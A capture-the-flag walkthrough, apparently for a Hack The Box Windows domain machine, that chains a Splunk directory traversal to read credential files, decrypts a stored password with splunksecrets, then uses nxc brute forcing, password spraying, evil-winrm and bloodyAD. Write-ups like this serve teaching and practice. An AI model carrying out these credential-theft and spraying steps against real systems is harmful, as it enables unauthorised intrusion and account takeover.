So to start off with this box, you have to start with an in-depth nmap command to get everything we need. The one I used was `nmap -sC -sV -vv -oA haze <IP>`.

```text
# Nmap 7.94SVN scan initiated Sat Mar 21 20:24:22 2026 as: nmap -sC -sV -vv -oA haze 10.129.232.50
Nmap scan report for 10.129.232.50
Host is up, received reset ttl 127 (0.010s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-22 09:24:29Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP
8088/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
8089/tcp open  ssl/http      syn-ack ttl 127 Splunkd httpd
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We look at LDAP to see we have Active Directory, so we need to add the DC to `/etc/hosts`.

Next we have a look at our hosts and try to find out what is vulnerable. If we look at the version on 8089, we find that the version of Splunk running is 9.2.1, which — if we go to [cvedetails.com](https://www.cvedetails.com/) — we can find a directory traversal exploit, which is usually low difficulty to exploit. There is a vulnerability in the `/en-us/modules/messaging` endpoint, which we can use to receive information back from the system. I personally used Burp Suite to get this to work. You need to use a certain amount of backwards traversal though, like 5 for me.

Now to get actual stuff from this file like any other box, you need to look up configuration files to get exact file paths to confidential places. `authentication.conf` is the place to start for Splunk. This honestly just requires knowing how to get there quickly, so lean on Google or Claude for help on file paths and stuff like this. See the [Splunk authentication.conf reference](https://help.splunk.com/en/data-management/splunk-enterprise-admin-manual/9.4/configuration-file-reference/9.4.0-configuration-file-reference/authentication.conf).

You also have to get the master key in `splunk.secret` to use `splunksecrets` to decrypt the files.

The directories are `/etc/system/local/authentication.conf` and `/etc/auth/splunk.secret`.

Below is what we get when we put everything together:

```bash
splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
# Ld@p_Auth_Sp1unk@2k24
```

Using a tool called **username-anarchy**, we can make a potential list for our user Paul Taylor from the file we got our password from. Then we use the below command to do some brute forcing:

```bash
nxc smb 10.129.232.50 -u user.txt -p pass.txt
```

Then we can use nxc to connect to the SMB server:

```bash
nxc smb <IP> -u user -p password
```

There's a lot of things you can do, but mainly you want to run RID brute forcing to find other users on the box, then try using password spraying on those accounts. You'll find that **mark.adams** uses the same password. You can then use evil-winrm to log on to the box.

You can then use **bloodyAD** to get some interesting ACLs that are writable:

```bash
bloodyAD --host DC01.haze.htb -d haze.htb -u mark.adams -p <password> get writable --detail
```
